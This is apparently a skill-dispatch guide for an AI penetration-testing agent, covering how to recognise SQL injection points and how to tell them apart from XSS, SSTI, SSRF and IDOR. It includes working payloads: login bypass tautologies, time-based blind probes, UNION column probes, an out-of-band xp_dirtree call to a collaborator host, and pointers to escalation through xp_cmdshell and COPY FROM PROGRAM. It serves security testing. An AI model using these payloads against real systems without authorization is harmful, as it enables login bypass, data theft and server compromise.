# sqli — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **A single quote breaks the response.** If appending `'` to a parameter flips a `200` into a `500`, an empty page, a stack trace, or a different result set — and the matching escaped quote `''` (or `%27%27`) restores normal behaviour → this skill applies. That round-trip is the canonical SQLi tell.
- **A database error string leaks in the body.** Any of: `You have an error in your SQL syntax`, `Unclosed quotation mark after the character string`, `ORA-00933`, `PG::SyntaxError`, `quoted string not properly terminated`, `Warning: mysqli_`, `SQLite3::SQLException`, `Microsoft OLE DB Provider for SQL Server`, `Conversion failed when converting`, `pq: ...`, `near "...": syntax error`. A DBMS naming itself in an error is the strongest fingerprint you get for free.
- **A numeric-looking parameter responds to arithmetic.** `id=5` and `id=4+1` (or `id=6-1`) returning the *same* record, while `id=5'` errors → the value is concatenated into SQL unquoted. Same logic for `id=5-0` vs `id=5-(SELECT 1)`.
- **Boolean tautology vs contradiction diverge.** `…?x=1' OR '1'='1` returns rows / login succeeds, while `…?x=1' AND '1'='2` returns nothing / login fails → predicate is being evaluated by a DB engine.
- **Listing/search/filter/sort endpoints.** Any URL with `id`, `pid`, `uid`, `cat`, `category`, `product`, `order`, `sort`, `orderby`, `dir`, `filter`, `search`, `q`, `page`, `limit`, `offset`, `from`, `to`, `start_date` is a default candidate — these almost always feed `WHERE`, `ORDER BY`, or `LIMIT`.
- **A `sort`/`order` parameter takes a column name.** `?sort=name` vs `?sort=price` reorders results. `ORDER BY` cannot be parameterised in most stacks, so this is a high-yield injection point that even otherwise-safe apps miss → dispatch here.
- **Login / auth forms.** A username or password field is a first-class SQLi target — try this skill before assuming creds are needed. Auth bypass via `' OR 1=1 --` is the cheapest possible win.
- **Recon fingerprints a relational DB.** Banners or tech detection showing MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, plus a PHP/Java/.NET/Node back end with dynamic content → the back end is talking SQL; probe every input.
- **Response timing tracks an injected sleep.** Baseline ~80 ms; `…?x=1' AND SLEEP(5)--` (MySQL) / `' OR pg_sleep(5)--` (Postgres) / `'; WAITFOR DELAY '0:0:5'--` (MSSQL) returns at ~5 s, repeatably, and `SLEEP(0)` returns fast → time-based blind SQLi confirmed. Use this when there is no visible error and no body diff.
- **Stored value re-renders differently in another view.** A name/comment/profile field saved on page A that later throws a SQL error when rendered on page B → second-order SQLi; this skill covers it.
- **Parameter shapes that scream raw SQL fragments.** A WHERE/filter object in JSON, GraphQL `filter:`/`where:`/`orderBy:` args, a query builder behind `whereRaw`/`orderByRaw`, or a report/export endpoint that embeds filters → all classic concatenation sinks.

## Use-case scenarios

- **First-pass parameter sweep on any data-backed app.** As soon as you have a crawl/param list (manually or via arjun/hakrawler), every GET/POST parameter, every cookie, and injectable headers (User-Agent, Referer, X-Forwarded-For when logged) get a quote/arithmetic/boolean probe. SQLi is high-impact and cheap to test, so it belongs early in the engagement on anything with a database.
- **Authentication bypass.** Login, password-reset, and "remember me" token lookups frequently build queries from the submitted identifier. Try tautologies and comment-truncation here before chasing credential attacks — a single `admin'--` can end the engagement.
- **Search, listing, and reporting surfaces.** Catalog filters, "my orders" pages, admin search, CSV/PDF exporters and analytics dashboards take rich, user-controlled filter/sort/group input that often lands in raw SQL even when the simple `id=` path is parameterised.
- **Identifier-position injection.** `ORDER BY`, `GROUP BY`, column/table selectors driven by `sort=`/`groupby=`/`col=`. These cannot use bound parameters, so they leak in apps that are otherwise careful with value placeholders. A high-value, under-tested surface.
- **ORM / query-builder edges.** Modern apps look "safe" but route a sliver of input through `whereRaw`, `orderByRaw`, `$queryRawUnsafe`, `sequelize.literal`, raw HQL/JPQL, or string-interpolated `LIKE`/`IN` lists. When you see a framework stack (Prisma, Sequelize, TypeORM, Knex, Hibernate, Django `.extra()`/`RawSQL`), still test — partial parameterisation leaves operators and lists unbound.
- **APIs with structured filters.** REST bodies with `{"filter": {...}, "sort": "..."}`, GraphQL resolvers, and WebSocket message payloads that drive a query layer. The injection is the same; only the transport differs.
- **Blind-only targets.** Generic 200/302 with no error text and no obvious body diff, but content or behaviour shifts on true/false predicates, or timing responds to `SLEEP`/`pg_sleep`/`WAITFOR`. This skill carries the boolean-bit-extraction and time-gated-subquery techniques needed to pull data with no visible channel.
- **Post-injection extraction and pivot.** Once a point is confirmed, this skill owns the follow-through: fingerprint the DBMS, enumerate schema, dump target tables, and — where the DB allows it — escalate (file read/write, `xp_cmdshell`, `COPY … FROM PROGRAM`, cloud metadata reads).

## Concrete tells (request → response examples)

- **Quote breakage:**
  `GET /item?id=10'` → `500` + `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version near '''` — injectable, DBMS = MySQL/MariaDB.
- **Arithmetic equivalence (numeric, unquoted):**
  `GET /item?id=10` → product #10. `GET /item?id=11-1` → still product #10. `GET /item?id=10'` → error. Confirms `… WHERE id = $input` with no quoting.
- **Boolean differential:**
  `GET /search?q=widget' AND 1=1-- -` → normal results.
  `GET /search?q=widget' AND 1=2-- -` → zero results / different page length. Predicate is evaluated → SQLi.
- **Login tautology:**
  `POST /login` `user=admin'-- &pass=x` → authenticated as admin (the `--` comments out the password check). Auth bypass.
- **Time-based blind (no visible output):**
  `GET /p?id=1' AND SLEEP(5)-- -` returns at ~5.0 s; `…id=1' AND SLEEP(0)-- -` returns fast; repeatable across attempts → time-based blind, MySQL.
  Postgres variant: `1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -`.
- **UNION column probe:**
  `?id=1 ORDER BY 5-- -` → OK, `ORDER BY 6-- -` → `Unknown column '6' in 'order clause'` → 5 columns. `?id=-1 UNION SELECT 1,2,3,4,5-- -` reflects `2`/`3` on the page → UNION extraction channel open.
- **ORDER BY identifier injection:**
  `?sort=(CASE WHEN (1=1) THEN name ELSE price END)` reorders results conditionally → boolean oracle in identifier position.
- **Out-of-band:**
  `?id=1; exec master..xp_dirtree '\\\\abc.<collab-id>.oast.site\\a'-- -` produces a DNS hit on your collaborator with no in-band response → blind OOB confirmed, DBMS = MSSQL.

## When NOT to use it / easily-confused-with

- **Reflected input that is never queried → not SQLi.** A value echoed into HTML/JS/attribute context with no DB involvement is **XSS**, not SQLi. The tell: it changes the *rendered page*, not the *result set*, and a quote produces broken markup, not a SQL error.
- **Input that lands in an OS command → command injection,** not SQLi. Shell metacharacters (`;`, `|`, `` ` ``, `$( )`) triggering command behaviour, not quote-driven SQL errors. Route to the command-injection skill.
- **Input that is evaluated as a template → SSTI,** not SQLi. `{{7*7}}` rendering as `49`, or `${...}`/`#{...}` expression evaluation, is server-side template injection. A reflected value is XSS, and it is SSTI only if it is *evaluated* — neither is SQLi.
- **A `url`/`uri`/`callback`/`webhook` parameter that fetches a resource → SSRF,** not SQLi. The tell is outbound request behaviour, not a query.
- **A `file`/`path`/`page`/`include`/`template` parameter that returns file contents or `/etc/passwd` on `../` traversal → LFI/path traversal,** not SQLi.
- **Object/record IDs you can swap to read someone else's data with no quote breakage → IDOR/access control,** not SQLi. `id=123` → `id=124` returning another user's record is an authorization flaw; only treat it as SQLi if quote/arithmetic/boolean probes also perturb the query.
- **NoSQL / non-relational stores.** Mongo operator injection (`username[$ne]=`), Cypher/Neo4j, and Redis behave differently from relational SQL. This skill does carry NoSQL/Cypher operator probes, so it is still the right dispatch — but classic SQL payloads (`UNION SELECT`, `SLEEP`) will not apply; switch to the operator-injection idioms.
- **Generic 500s, static templated response sizes, and network/CPU jitter are false positives.** A `500` that fires on *any* malformed input (not just an unbalanced quote), a body length fixed by templating regardless of predicate truth, or a one-off slow request that does not track `SLEEP(n)` are not SQLi. Require an oracle that *flips when you toggle the predicate* and reproduces.

B:sqli done

